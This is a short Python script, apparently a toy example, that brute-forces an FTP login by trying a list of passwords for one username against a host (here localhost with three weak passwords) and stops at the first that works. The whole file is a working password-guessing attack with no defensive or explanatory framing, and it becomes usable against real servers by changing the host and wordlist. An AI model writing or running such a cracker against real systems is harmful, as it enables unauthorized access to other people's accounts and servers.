from ftplib import FTP

def attempt_ftp_login(host, username, password):
    ftp = FTP(host)
    try:
        ftp.login(username, password)
        print(f"Login successful with {username}:{password}")
        ftp.quit()
        return True
    except:
        print(f"Failed login with {username}:{password}")
        return False

def crack_password(host, username, passwords):
    for password in passwords:
        if attempt_ftp_login(host, username, password):
            break

host = 'localhost'
username = 'user'
passwords = ['123', 'password', 'secret']

crack_password(host, username, passwords)
